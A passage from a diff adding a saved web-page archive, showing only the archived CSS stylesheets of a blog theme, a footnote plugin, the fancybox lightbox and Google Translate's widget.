+, 51, 0.5); border-image: initial; border-left: 6px solid rgb(51, 51, 51); =
+border-right: none; background: rgba(51, 51, 51, 0.5); }
+
+table { border-collapse: collapse; }
+
+th, td { border: 1px solid rgb(34, 85, 102); padding: 0.3em 0.5em; }
+
+hr { border-right: none; border-bottom: none; border-left: none; border-ima=
+ge: initial; border-top: 1px double rgb(76, 64, 8); width: 100%; margin: 20=
+px 0px; }
+
+del { text-decoration: line-through; opacity: 0.6; }
+
+strong, b { font-weight: 600; color: rgba(16, 226, 16, 0.88); }
+
+em, i { font-family: "Open Sans"; font-style: italic; color: rgb(233, 109, =
+50); }
+
+.article-header { padding-bottom: 2em; }
+
+.article-header div { color: white; }
+
+.article-header div span { color: darkkhaki; margin: 0px 4px; }
+
+.article-header div a { margin: 0px 4px; }
+
+.micro-say img { max-width: 30%; max-height: 20%; }
+
+.micro-say pre { border: 1px none rgb(204, 34, 102); margin-left: 0px; top:=
+ -1em; text-align: right; background-color: rgba(113, 0, 128, 0); }
+
+.micro-say pre code { color: green; }
+
+.micro-say pre:hover { background-color: rgba(113, 0, 128, 0); }
+
+.pagination ul { list-style: none; }
+
+.tocWrap { z-index: 100; top: 16%; right: 2.8%; }
+
+@media print {
+  .tocWrap { display: none; }
+}
+
+@media screen and (min-width: 768px) {
+  .tocWrap { position: fixed; width: 250px; }
+}
+
+.tocWrap .menu { text-align: center; width: 100%; background-color: rgb(240=
+, 200, 30); border-radius: 2px 2px 0px 0px; color: rgb(17, 34, 34); positio=
+n: relative; z-index: 101; cursor: pointer; }
+
+.tocWrap ul { margin: 0px; padding: 0px; }
+
+.tocWrap #markdown-toc { overflow-y: auto; height: auto; position: relative=
+; border: 1px solid rgb(240, 200, 30); border-radius: 0px 0px 1px 1px; colo=
+r: rgb(153, 153, 153); background: rgba(10, 30, 40, 0.85); box-shadow: rgb(=
+0, 0, 0) 0px 1px 8px; }
+
+.tocWrap #markdown-toc li { list-style-position: inside; padding: 0px !impo=
+rtant; }
+
+.micro-say-list li { display: inline-block; margin: 0.3em auto; }
+
+.post-category { border: 1px dashed rgb(24, 68, 95); background-color: rgb(=
+24, 68, 95); }
+
+.post-category:hover { border: 1px dashed rgb(70, 88, 99); background-color=
+: rgb(70, 88, 99); }
+
+.back-to-top { position: fixed; right: 30px; width: 24px; height: 26px; bot=
+tom: -100px; background: rgb(25, 35, 35); line-height: 0; z-index: 1050; cu=
+rsor: pointer; transition: all 200ms ease-in-out 0s; }
+
+.back-to-top .back-to-top-wrap { position: relative; width: 100%; height: 1=
+00%; }
+
+.back-to-top span { background: rgb(0, 216, 255); position: absolute; displ=
+ay: inline-block; vertical-align: top; height: 2px; margin-top: 3px; transf=
+orm: rotate(90deg); top: 9px; width: 60%; left: 5px; }
+
+.back-to-top span:first-child { width: 50%; transform: rotateZ(-45deg); top=
+: 4px; left: 2px; }
+
+.back-to-top span:last-child { width: 50%; transform: rotateZ(45deg); right=
+: 2px; top: 4px; left: auto; }
+
+.back-to-top-on { bottom: 19px; }
+
+.sidebar-toggle { position: fixed; right: 30px; bottom: 45px; width: 14px; =
+height: 16px; padding: 5px; background: rgb(25, 35, 35); line-height: 0; z-=
+index: 1050; cursor: pointer; }
+
+@media (max-width: 767px) {
+  .sidebar-toggle { top: 16px; }
+}
+
+.sidebar-toggle .sidebar-toggle-line { background: rgb(0, 216, 255); positi=
+on: relative; display: inline-block; vertical-align: top; height: 2px; widt=
+h: 100%; margin-top: 3px; top: 0px; left: 0px; transition: all 200ms ease 0=
+s; }
+
+.sidebar-toggle .sidebar-toggle-line-wrap:hover .sidebar-toggle-line-first =
+{ width: 50%; top: 2px; transform: rotateZ(-45deg); }
+
+.sidebar-toggle .sidebar-toggle-line-wrap:hover .sidebar-toggle-line-last {=
+ width: 50%; top: -2px; transform: rotateZ(45deg); }
+
+.sidebar { position: fixed; right: 0px; top: 0px; bottom: 0px; width: 320px=
+; z-index: 1000; box-shadow: black 0px 2px 6px inset; background: rgb(34, 3=
+4, 34); transform: translate3d(100%, 0px, 0px); transition: all 100ms ease =
+0s; }
+
+.sidebar a { color: rgb(153, 153, 153); border-bottom-color: rgb(85, 85, 85=
+); }
+
+.sidebar a:hover { color: rgb(238, 238, 238); }
+
+.sidebar-inner { position: relative; padding: 20px 10px; color: rgb(153, 15=
+3, 153); text-align: center; }
+
+.sidebar-inner li { display: inline-block; cursor: pointer; border-bottom: =
+1px solid transparent; font-size: 14px; color: rgb(85, 85, 85); line-height=
+: 2; }
+
+.sidebar-inner .sidebar-active { color: rgb(135, 218, 255); border-bottom-c=
+olor: rgb(135, 218, 255); padding: 0px 5px; }
+
+.sidebar-panel { overflow: auto; display: none; }
+
+.sidebar-panel.sidebar-active { display: block; }
+
+.sidebar-panel ul { margin: 0px; padding: 0px; }
+
+.sidebar-panel ul li { list-style-position: inside; padding: 0px !important=
+; }
+
+.sidebar-panel .sidebar-nav a { display: block; width: 100%; height: 45px; =
+line-height: 45px; padding-left: 25px; }
+
+.sidebar-panel .sidebar-nav a.active { color: rgb(0, 216, 255); background:=
+ rgb(47, 60, 66); }
+
+#markdown-toc { overflow: auto; }
+
+#markdown-toc .active > a { color: rgb(135, 218, 255); border-bottom-color:=
+ rgb(135, 218, 255); }
+
+.body-sidebar .sidebar-toggle .sidebar-toggle-line-wrap .sidebar-toggle-lin=
+e-first { width: 100%; top: 5px; transform: rotateZ(-45deg); }
+
+.body-sidebar .sidebar-toggle .sidebar-toggle-line-wrap .sidebar-toggle-lin=
+e-middle { width: 0px; }
+
+.body-sidebar .sidebar-toggle .sidebar-toggle-line-wrap .sidebar-toggle-lin=
+e-last { width: 100%; top: -5px; transform: rotateZ(45deg); }
+
+.body-sidebar .sidebar { display: block; transform: translate3d(0px, 0px, 0=
+px); }
+
+.tag_box { list-style: none; display: block; }
+
+.tag_box .tag-name-selected a { background-color: teal; }
+
+.tag_box li { float: left; cursor: pointer; }
+
+.tag_box li a { display: inline-block; border-radius: 5px; padding: 5px 10p=
+x; margin: 0px 0.5px; color: cyan; text-decoration: none; }
+
+.tag_box li a:hover { opacity: 0.39; }
+
+.tag_box li span { vertical-align: super; font-size: 0.64em; }
+
+.highlight table td { padding: 5px; }
+
+.highlight table pre { margin: 0px; }
+
+.highlight .c, .highlight .cd { color: rgb(94, 93, 131); font-style: italic=
+; }
+
+.highlight .cm { color: rgb(94, 93, 131); font-style: italic; }
+
+.highlight .c1 { color: rgb(94, 93, 131); font-style: italic; }
+
+.highlight .cp { color: rgb(70, 84, 87); font-weight: bold; }
+
+.highlight .cs { color: rgb(70, 84, 87); font-weight: bold; font-style: ita=
+lic; }
+
+.highlight .err { color: rgb(248, 248, 242); background-color: rgb(64, 61, =
+61); }
+
+.highlight .gi { color: rgb(166, 226, 46); }
+
+.highlight .gd { color: rgb(249, 38, 114); }
+
+.highlight .ge { color: rgb(27, 29, 30); font-style: italic; }
+
+.highlight .gr { color: rgb(249, 38, 114); }
+
+.highlight .gt { color: rgb(249, 38, 114); }
+
+.highlight .gh { color: rgb(64, 61, 61); }
+
+.highlight .go { color: rgb(64, 61, 61); }
+
+.highlight .gp { color: rgb(102, 217, 239); }
+
+.highlight .gs { font-weight: bold; }
+
+.highlight .gu { color: rgb(70, 84, 87); }
+
+.highlight .k, .highlight .kv { color: rgb(102, 217, 239); font-weight: bol=
+d; }
+
+.highlight .kc { color: rgb(102, 217, 239); font-weight: bold; }
+
+.highlight .kd { color: rgb(102, 217, 239); font-weight: bold; }
+
+.highlight .kp { color: rgb(102, 217, 239); font-weight: bold; }
+
+.highlight .kr { color: rgb(102, 217, 239); font-weight: bold; }
+
+.highlight .kt { color: rgb(102, 217, 239); font-weight: bold; }
+
+.highlight .kn { color: rgb(249, 38, 114); font-weight: bold; }
+
+.highlight .ow { color: rgb(249, 38, 114); font-weight: bold; }
+
+.highlight .o { color: rgb(249, 38, 114); font-weight: bold; }
+
+.highlight .mf { color: rgb(175, 135, 255); }
+
+.highlight .mh { color: rgb(175, 135, 255); }
+
+.highlight .il { color: rgb(175, 135, 255); }
+
+.highlight .mi { color: rgb(175, 135, 255); }
+
+.highlight .mo { color: rgb(175, 135, 255); }
+
+.highlight .m, .highlight .mb, .highlight .mx { color: rgb(175, 135, 255); =
+}
+
+.highlight .se { color: rgb(175, 135, 255); }
+
+.highlight .sb { color: rgb(215, 215, 135); }
+
+.highlight .sc { color: rgb(215, 215, 135); }
+
+.highlight .sd { color: rgb(215, 215, 135); }
+
+.highlight .s2 { color: rgb(215, 215, 135); }
+
+.highlight .sh { color: rgb(215, 215, 135); }
+
+.highlight .si { color: rgb(215, 215, 135); }
+
+.highlight .sx { color: rgb(215, 215, 135); }
+
+.highlight .sr { color: rgb(215, 215, 135); }
+
+.highlight .s1 { color: rgb(215, 215, 135); }
+
+.highlight .ss { color: rgb(215, 215, 135); }
+
+.highlight .s { color: rgb(215, 215, 135); }
+
+.highlight .na { color: rgb(166, 226, 46); }
+
+.highlight .nc { color: rgb(166, 226, 46); font-weight: bold; }
+
+.highlight .nd { color: rgb(166, 226, 46); font-weight: bold; }
+
+.highlight .ne { color: rgb(166, 226, 46); font-weight: bold; }
+
+.highlight .nf { color: rgb(166, 226, 46); font-weight: bold; }
+
+.highlight .no { color: rgb(102, 217, 239); }
+
+.highlight .bp { color: rgb(248, 248, 242); }
+
+.highlight .nb { color: rgb(248, 248, 242); }
+
+.highlight .ni { color: rgb(248, 248, 242); }
+
+.highlight .nn { color: rgb(248, 248, 242); }
+
+.highlight .vc { color: rgb(248, 248, 242); }
+
+.highlight .vg { color: rgb(248, 248, 242); }
+
+.highlight .vi { color: rgb(248, 248, 242); }
+
+.highlight .nv { color: rgb(248, 248, 242); }
+
+.highlight .w { color: rgb(248, 248, 242); }
+
+.highlight .nl { color: rgb(248, 248, 242); font-weight: bold; }
+
+.highlight .nt { color: rgb(249, 38, 114); }
+
+.highlight { color: rgb(248, 248, 242); background-color: rgb(27, 29, 30); }
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: https://www.ifmicro.com/assets/css/bigfoot-number.css?2.1.4
+
+@charset "utf-8";
+
+.bigfoot-footnote__button { position: relative; z-index: 5; top: -0.1em; bo=
+x-sizing: border-box; display: inline-block; padding: 0.35em; margin: 0px 0=
+.1em 0px 0.2em; border: none; border-radius: 0.3em; cursor: pointer; backgr=
+ound-color: rgba(110, 110, 110, 0.2); backface-visibility: hidden; font-siz=
+e: 1rem; line-height: 0; vertical-align: middle; text-decoration: none; -we=
+bkit-font-smoothing: antialiased; transition-property: background-color; tr=
+ansition-duration: 0.25s; }
+
+.bigfoot-footnote__button:hover, .bigfoot-footnote__button:focus { outline:=
+ none; background-color: rgba(110, 110, 110, 0.5); }
+
+.bigfoot-footnote__button:active { background-color: rgba(110, 110, 110, 0.=
+5); }
+
+.bigfoot-footnote__button.is-active { background-color: rgb(110, 110, 110);=
+ transition-delay: 0.1s; }
+
+.bigfoot-footnote__button::after { content: ""; display: table; clear: both=
+; }
+
+.bigfoot-footnote__button__circle { display: inline-block; width: 0.25em; h=
+eight: 0.25em; margin-right: 0.25em; float: left; }
+
+.bigfoot-footnote__button__circle:last-child { margin-right: 0px; }
+
+.bigfoot-footnote__container { display: inline-block; position: relative; t=
+ext-indent: 0px; }
+
+@media not print {
+  .footnote-print-only { display: none !important; }
+}
+
+@media print {
+  .bigfoot-footnote, .bigfoot-footnote__button { display: none !important; =
+}
+}
+
+.bigfoot-footnote { position: absolute; z-index: 10; top: 0px; left: 0px; d=
+isplay: inline-block; box-sizing: border-box; max-width: 90%; margin: 1.969=
+24em 0px; background: rgb(250, 250, 250); opacity: 0; border-radius: 0.5em;=
+ border: 1px solid rgb(195, 195, 195); box-shadow: rgba(0, 0, 0, 0.3) 0px 0=
+px 8px; line-height: 0; transition-property: opacity, transform; transition=
+-duration: 0.25s; transition-timing-function: ease; transform: scale(0.1) t=
+ranslateZ(0px); transform-origin: 50% 0px; }
+
+.bigfoot-footnote.is-positioned-top { top: auto; bottom: 0px; }
+
+.bigfoot-footnote.is-active { transform: scale(1) translateZ(0px); opacity:=
+ 0.97; }
+
+.bigfoot-footnote.is-bottom-fixed { position: fixed; bottom: 0px; top: auto=
+; left: 0px; right: auto; transform: translateY(100%); width: 100%; margin:=
+ 0px; border-radius: 0px; opacity: 1; border-width: 1px 0px 0px; transition=
+: transform 0.3s ease 0s; }
+
+.bigfoot-footnote.is-bottom-fixed.is-active { transform: translateY(0px); }
+
+.bigfoot-footnote.is-bottom-fixed .bigfoot-footnote__wrapper { margin: 0px =
+0px 0px 50%; transform: translateX(-50%); max-width: 100%; }
+
+.bigfoot-footnote.is-bottom-fixed .bigfoot-footnote__wrapper, .bigfoot-foot=
+note.is-bottom-fixed .bigfoot-footnote__content { border-radius: 0px; }
+
+.bigfoot-footnote.is-bottom-fixed .bigfoot-footnote__tooltip { display: non=
+e; }
+
+.bigfoot-footnote.is-scrollable::after { content: ""; position: absolute; b=
+ottom: 0.3375em; left: 0.3375em; z-index: 14; display: block; height: 0.781=
+25em; width: 0.625em; background-image: url("data:image/svg+xml;base64,PHN2=
+ZyB3aWR0aD0iMTJweCIgaGVpZ2h0PSIxNXB4IiB2aWV3Qm94PSIwIDAgMTIgMTUiIHZlcnNpb24=
+9IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaH=
+R0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgcHJlc2VydmVBc3BlY3RSYXRpbz0ieE1pbllNa=
+W4iPgogICAgPGcgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZp=
+bGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPGcgaWQ9IkFycm93IiB0cmFuc2Zvcm09InRyYW5=
+zbGF0ZSgxLjAwMDAwMCwgMS4wMDAwMDApIiBzdHJva2U9ImJsYWNrIiBzdHJva2Utd2lkdGg9Ij=
+IiIHN0cm9rZS1saW5lY2FwPSJzcXVhcmUiPgogICAgICAgICAgICA8cGF0aCBkPSJNNSwwIEw1L=
+DExLjUiIGlkPSJMaW5lIj48L3BhdGg+CiAgICAgICAgICAgIDxwYXRoIGQ9Ik0wLjUsNy41IEw1=
+LjAyNzY5Mjc5LDEyLjAyNzY5MjgiIGlkPSJMaW5lIj48L3BhdGg+CiAgICAgICAgICAgIDxwYXR=
+oIGQ9Ik00LjUsNy41IEw5LjAyNzY5Mjc5LDEyLjAyNzY5MjgiIGlkPSJMaW5lLTIiIHRyYW5zZm=
+9ybT0idHJhbnNsYXRlKDcuMDAwMDAwLCAxMC4wMDAwMDApIHNjYWxlKC0xLCAxKSB0cmFuc2xhd=
+GUoLTcuMDAwMDAwLCAtMTAuMDAwMDAwKSAiPjwvcGF0aD4KICAgICAgICA8L2c+CiAgICA8L2c+=
+Cjwvc3ZnPgo=3D"); background-size: cover; opacity: 0.1; transition-duration=
+: 0.25s; transition-timing-function: ease; }
+
+.bigfoot-footnote.is-scrollable .bigfoot-footnote__wrapper::before, .bigfoo=
+t-footnote.is-scrollable .bigfoot-footnote__wrapper::after { content: ""; p=
+osition: absolute; width: 100%; z-index: 12; left: 0px; }
+
+.bigfoot-footnote.is-scrollable .bigfoot-footnote__wrapper::before { top: -=
+1px; height: 1.1em; border-radius: 0.5em 0.5em 0px 0px; background-image: l=
+inear-gradient(rgb(250, 250, 250) 50%, rgba(250, 250, 250, 0) 100%); }
+
+.bigfoot-footnote.is-scrollable .bigfoot-footnote__wrapper::after { bottom:=
+ -1px; height: 1.2em; border-radius: 0px 0px 0.5em 0.5em; background-image:=
+ linear-gradient(to top, rgb(250, 250, 250) 50%, rgba(250, 250, 250, 0) 100=
+%); }
+
+.bigfoot-footnote.is-scrollable ::-webkit-scrollbar { display: none; }
+
+.bigfoot-footnote.is-fully-scrolled::after, .bigfoot-footnote.is-fully-scro=
+lled::before { opacity: 0; }
+
+.bigfoot-footnote__wrapper { position: relative; z-index: 14; width: 22em; =
+display: inline-block; box-sizing: inherit; overflow: hidden; margin: 0px; =
+background-color: rgb(250, 250, 250); border-radius: 0.5em; line-height: 0;=
+ }
+
+.bigfoot-footnote__content { position: relative; z-index: 8; display: inlin=
+e-block; max-height: 15em; padding: 1.1em 1.3em 1.2em; box-sizing: inherit;=
+ overflow: auto; background: rgb(250, 250, 250); border-radius: 0.5em; colo=
+r: rgb(0, 0, 0); -webkit-font-smoothing: subpixel-antialiased; line-height:=
+ normal; }
+
+.bigfoot-footnote__content img { max-width: 100%; }
+
+.bigfoot-footnote__content :last-child { margin-bottom: 0px !important; }
+
+.bigfoot-footnote__content :first-child { margin-top: 0px !important; }
+
+.bigfoot-footnote__tooltip { position: absolute; z-index: 12; box-sizing: b=
+order-box; margin-left: -0.65em; width: 1.3em; height: 1.3em; transform: ro=
+tate(45deg); background: rgb(250, 250, 250); border: 1px solid rgb(195, 195=
+, 195); box-shadow: rgba(0, 0, 0, 0.3) 0px 0px 8px; border-top-left-radius:=
+ 0px; }
+
+.is-positioned-bottom .bigfoot-footnote__tooltip { top: -0.65em; }
+
+.is-positioned-top .bigfoot-footnote__tooltip { bottom: -0.65em; }
+
+.bigfoot-footnote__button { position: relative; height: 0.95em; width: 1.5e=
+m; border-radius: 0.475em; }
+
+.bigfoot-footnote__button::after { content: attr(data-footnote-number); pos=
+ition: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); dis=
+play: block; font-size: 0.57em; font-weight: bold; color: rgba(110, 110, 11=
+0, 0.5); transition: color 0.25s ease 0s; }
+
+.bigfoot-footnote__button:hover::after, .bigfoot-footnote__button.is-active=
+::after { color: white; }
+
+.bigfoot-footnote__button__circle { display: none; }
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: https://www.ifmicro.com/assets/lib/fancybox/source/jquery.fancybox.css?2.1.5
+
+@charset "utf-8";
+
+.fancybox-wrap, .fancybox-skin, .fancybox-outer, .fancybox-inner, .fancybox=
+-image, .fancybox-wrap iframe, .fancybox-wrap object, .fancybox-nav, .fancy=
+box-nav span, .fancybox-tmp { padding: 0px; margin: 0px; border: 0px; outli=
+ne: none; vertical-align: top; }
+
+.fancybox-wrap { position: absolute; top: 0px; left: 0px; z-index: 8020; }
+
+.fancybox-skin { position: relative; background: rgb(249, 249, 249); color:=
+ rgb(68, 68, 68); text-shadow: none; border-radius: 4px; }
+
+.fancybox-opened { z-index: 8030; }
+
+.fancybox-opened .fancybox-skin { box-shadow: rgba(0, 0, 0, 0.5) 0px 10px 2=
+5px; }
+
+.fancybox-outer, .fancybox-inner { position: relative; }
+
+.fancybox-inner { overflow: hidden; }
+
+.fancybox-type-iframe .fancybox-inner { }
+
+.fancybox-error { color: rgb(68, 68, 68); font: 14px / 20px "Helvetica Neue=
+", Helvetica, Arial, sans-serif; margin: 0px; padding: 15px; white-space: n=
+owrap; }
+
+.fancybox-image, .fancybox-iframe { display: block; width: 100%; height: 10=
+0%; }
+
+.fancybox-image { max-width: 100%; max-height: 100%; }
+
+#fancybox-loading, .fancybox-close, .fancybox-prev span, .fancybox-next spa=
+n { background-image: url("fancybox_sprite.png"); }
+
+#fancybox-loading { position: fixed; top: 50%; left: 50%; margin-top: -22px=
+; margin-left: -22px; background-position: 0px -108px; opacity: 0.8; cursor=
+: pointer; z-index: 8060; }
+
+#fancybox-loading div { width: 44px; height: 44px; background: url("fancybo=
+x_loading.gif") center center no-repeat; }
+
+.fancybox-close { position: absolute; top: -18px; right: -18px; width: 36px=
+; height: 36px; cursor: pointer; z-index: 8040; }
+
+.fancybox-nav { position: absolute; top: 0px; width: 40%; height: 100%; cur=
+sor: pointer; text-decoration: none; background: url("blank.gif") transpare=
+nt; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); z-index: 8040; }
+
+.fancybox-prev { left: 0px; }
+
+.fancybox-next { right: 0px; }
+
+.fancybox-nav span { position: absolute; top: 50%; width: 36px; height: 34p=
+x; margin-top: -18px; cursor: pointer; z-index: 8040; visibility: hidden; }
+
+.fancybox-prev span { left: 10px; background-position: 0px -36px; }
+
+.fancybox-next span { right: 10px; background-position: 0px -72px; }
+
+.fancybox-nav:hover span { visibility: visible; }
+
+.fancybox-tmp { position: absolute; top: -99999px; left: -99999px; visibili=
+ty: hidden; max-width: 99999px; max-height: 99999px; overflow: visible !imp=
+ortant; }
+
+.fancybox-lock { width: auto; overflow: hidden !important; }
+
+.fancybox-lock body { overflow: hidden !important; }
+
+.fancybox-lock-test { overflow-y: hidden !important; }
+
+.fancybox-overlay { position: absolute; top: 0px; left: 0px; overflow: hidd=
+en; display: none; z-index: 8010; background: url("fancybox_overlay.png"); =
+}
+
+.fancybox-overlay-fixed { position: fixed; bottom: 0px; right: 0px; }
+
+.fancybox-lock .fancybox-overlay { overflow: auto scroll; }
+
+.fancybox-title { visibility: hidden; font: 13px / 20px "Helvetica Neue", H=
+elvetica, Arial, sans-serif; position: relative; text-shadow: none; z-index=
+: 8050; }
+
+.fancybox-opened .fancybox-title { visibility: visible; }
+
+.fancybox-title-float-wrap { position: absolute; bottom: 0px; right: 50%; m=
+argin-bottom: -35px; z-index: 8050; text-align: center; }
+
+.fancybox-title-float-wrap .child { display: inline-block; margin-right: -1=
+00%; padding: 2px 20px; background: rgba(0, 0, 0, 0.8); border-radius: 15px=
+; text-shadow: rgb(34, 34, 34) 0px 1px 2px; color: rgb(255, 255, 255); font=
+-weight: bold; line-height: 24px; white-space: nowrap; }
+
+.fancybox-title-outside-wrap { position: relative; margin-top: 10px; color:=
+ rgb(255, 255, 255); }
+
+.fancybox-title-inside-wrap { padding-top: 10px; }
+
+.fancybox-title-over-wrap { position: absolute; bottom: 0px; left: 0px; col=
+or: rgb(255, 255, 255); padding: 10px; background: rgba(0, 0, 0, 0.8); }
+
+@media only screen and (-webkit-min-device-pixel-ratio: 1.5), not all, not =
+all {
+  #fancybox-loading, .fancybox-close, .fancybox-prev span, .fancybox-next s=
+pan { background-image: url("fancybox_sprite@2x.png"); background-size: 44p=
+x 152px; }
+  #fancybox-loading div { background-image: url("fancybox_loading@2x.gif");=
+ background-size: 24px 24px; }
+}
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: https://translate.googleapis.com/translate_static/css/translateelement.css
+
+@charset "utf-8";
+
+.goog-te-banner-frame { left: 0px; top: 0px; height: 39px; width: 100%; z-i=
+ndex: 10000001; position: fixed; border-top: none; border-right: none; bord=
+er-left: none; border-image: initial; border-bottom: 1px solid rgb(107, 144=
+, 218); margin: 0px; box-shadow: rgb(153, 153, 153) 0px 0px 8px 1px; }
+
+.goog-te-menu-frame { z-index: 10000002; position: fixed; border: none; box=
+-shadow: rgb(153, 153, 153) 0px 3px 8px 2px; }
+
+.goog-te-ftab-frame { z-index: 10000000; border: none; margin: 0px; }
+
+.goog-te-gadget { font-family: arial; font-size: 11px; color: rgb(102, 102,=
+ 102); white-space: nowrap; }
+
+.goog-te-gadget img { vertical-align: middle; border: none; }
+
+.goog-te-gadget-simple { background-color: rgb(255, 255, 255); border-width=
+: 1px; border-style: solid; border-color: rgb(155, 155, 155) rgb(213, 213, =
+213) rgb(232, 232, 232); font-size: 10pt; display: inline-block; padding-to=
+p: 1px; padding-bottom: 2px; cursor: pointer; zoom: 1; }
+
+.goog-te-gadget-icon { margin-left: 2px; margin-right: 2px; width: 19px; he=
+ight: 19px; border: none; vertical-align: middle; }
+
+.goog-te-combo { margin-left: 4px; margin-right: 4px; vertical-align: basel=
+ine; }
+
+.goog-te-gadget .goog-te-combo { margin: 4px 0px; }
+
+.goog-logo-link, .goog-logo-link:link, .goog-logo-link:visited, .goog-logo-=
+link:hover, .goog-logo-link:active { font-size: 12px; font-weight: bold; co=
+lor: rgb(68, 68, 68); text-decoration: none; }
+
+.goog-te-banner .goog-logo-link, .goog-close-link { display: block; margin:=
+ 0px 10px; }
+
+.goog-te-banner .goog-logo-link { padding-top: 2px; padding-left: 4px; }
+
+.goog-te-combo, .goog-te-banner *, .goog-te-ftab *, .goog-te-menu *, .goog-=
+te-menu2 *, .goog-te-balloon * { font-family: arial; font-size: 10pt; }
+
+.goog-te-banner { margin: 0px; background-color: rgb(228, 239, 251); overfl=
+ow: hidden; }
+
+.goog-te-banner img { border: none; }
+
+.goog-te-banner-content { color: rgb(0, 0, 0); }
+
+.goog-te-banner-content img { vertical-align: middle; }
+
+.goog-te-banner-info { color: rgb(102, 102, 102); vertical-align: top; marg=
+in-top: 0px; font-size: 7pt; }
+
+.goog-te-banner-margin { width: 8px; }
+
+.goog-te-button { border-color: rgb(231, 231, 231); border-style: none soli=
+d solid none; border-width: 0px 1px 1px 0px; }
+
+.goog-te-button div { border-color: rgb(204, 204, 204) rgb(153, 153, 153) r=
+gb(153, 153, 153) rgb(204, 204, 204); border-style: solid; border-width: 1p=
+x; height: 20px; }
+
+.goog-te-button button { background: transparent; border: none; cursor: poi=
+nter; height: 20px; overflow: hidden; margin: 0px; vertical-align: top; whi=
+te-space: nowrap; }
+
+.goog-te-button button:active { background: none 0px 0px repeat scroll rgb(=
+204, 204, 204); }
+
+.goog-te-ftab { margin: 0px; background-color: rgb(255, 255, 255); white-sp=
+ace: nowrap; }
+
+.goog-te-ftab-link { text-decoration: none; font-weight: bold; font-size: 1=
+0pt; border: 1px outset rgb(136, 136, 136); padding: 6px 10px; white-space:=
+ nowrap; position: absolute; left: 0px; top: 0px; }
+
+.goog-te-ftab-link img { margin-left: 2px; margin-right: 2px; width: 19px; =
+height: 19px; border: none; vertical-align: middle; }
+
+.goog-te-ftab-link span { text-decoration: underline; margin-left: 2px; mar=
+gin-right: 2px; vertical-align: middle; }
+
+.goog-float-top .goog-te-ftab-link { padding: 2px; border-top-width: 0px; }
+
+.goog-float-bottom .goog-te-ftab-link { padding: 2px; border-bottom-width: =
+0px; }
+
+.goog-te-menu-value { text-decoration: none; color: rgb(0, 0, 204); white-s=
+pace: nowrap; margin-left: 4px; margin-right: 4px; }
+
+.goog-te-menu-value span { text-decoration: underline; }
+
+.goog-te-menu-value img { margin-left: 2px; margin-right: 2px; }
+
+.goog-te-gadget-simple .goog-te-menu-value { color: rgb(0, 0, 0); }
+
+.goog-te-gadget-simple .goog-te-menu-value span { text-decoration: none; }
+
+.goog-te-menu { background-color: rgb(255, 255, 255); text-decoration: none=
+; border: 2px solid rgb(195, 217, 255); overflow: hidden scroll; position: =
+absolute; left: 0px; top: 0px; }
+
+.goog-te-menu-item { padding: 3px; text-decoration: none; }
+
+.goog-te-menu-item, .goog-te-menu-item:link { color: rgb(0, 0, 204); backgr=
+ound: rgb(255, 255, 255); }
+
+.goog-te-menu-item:visited { color: rgb(85, 26, 139); }
+
+.goog-te-menu-item:hover { background: rgb(195, 217, 255); }
+
+.goog-te-menu-item:active { color: rgb(0, 0, 204); }
+
+.goog-te-menu2 { background-color: rgb(255, 255, 255); text-decoration: non=
+e; border: 1px solid rgb(107, 144, 218); overflow: hidden; padding: 4px; }
+
+.goog-te-menu2-colpad { width: 16px; }
+
+.goog-te-menu2-separator { margin: 6px 0px; height: 1px; background-color: =
+rgb(170, 170, 170); overflow: hidden; }
+
+.goog-te-menu2-item div, .goog-te-menu2-item-selected div { padding: 4px; }
+
+.goog-te-menu2-item .indicator { display: none; }
+
+.goog-te-menu2-item-selected .indicator { }
+
+.goog-te-menu2-item-selected .text { padding-left: 4px; padding-right: 4px;=
+ }
+
+.goog-te-menu2-item, .goog-te-menu2-item-selected { text-decoration: none; =
+}
+
+.goog-te-menu2-item div, .goog-te-menu2-item:link div, .goog-te-menu2-item:=
+visited div, .goog-te-menu2-item:active div { color: rgb(0, 0, 204); backgr=
+ound: rgb(255, 255, 255); }
+
+.goog-te-menu2-item:hover div { color: rgb(255, 255, 255); background: rgb(=
+51, 102, 204); }
+
+.goog-te-menu2-item-selected div, .goog-te-menu2-item-selected:link div, .g=
+oog-te-menu2-item-selected:visited div, .goog-te-menu2-item-selected:hover =
+div, .goog-te-menu2-item-selected:active div { color: rgb(0, 0, 0); font-we=
+ight: bold; }
+
+.goog-te-balloon { background-color: rgb(255, 255, 255); overflow: hidden; =
+padding: 8px; border: none; border-radius: 10px; }
+
+.goog-te-balloon-frame { background-color: rgb(255, 255, 255); border: 1px =
+solid rgb(107, 144, 218); box-shadow: rgb(153, 153, 153) 0px 3px 8px 2px; b=
+order-radius: 8px; }
+
+.goog-te-balloon img { border: none; }
+
+.goog-te-balloon-text { margin-top: 6px; }
+
+.goog-te-balloon-zippy { margin-top: 6px; white-space: nowrap; }
+
+.goog-te-balloon-zippy * { vertical-align: middle; }
+
+.goog-te-balloon-zippy .minus { background-image: url("//www.google.com/ima=
+ges/zippy_minus_sm.gif"); }
+
+.goog-te-balloon-zippy .plus { background-image: url("//www.google.com/imag=
+es/zippy_plus_sm.gif"); }
+
+.goog-te-balloon-zippy span { color: rgb(0, 0, 204); text-decoration: under=
+line; cursor: pointer; margin: 0px 4px; }
+
+.goog-te-balloon-form { margin: 6px 0px 0px; }
+
+.goog-te-balloon-form form { margin: 0px; }
+
+.goog-te-balloon-form form textarea { margin-bottom: 4px; width: 100%; }
+
+.goog-te-balloon-footer { margin: 6px 0px 4px; }
+
+.goog-te-spinner-pos { z-index: 1000; position: fixed; transition-delay: 0.=
+6s; left: -1000px; top: -1000px; }
+
+.goog-te-spinner-animation { display: flex; align-items: center; justify-co=
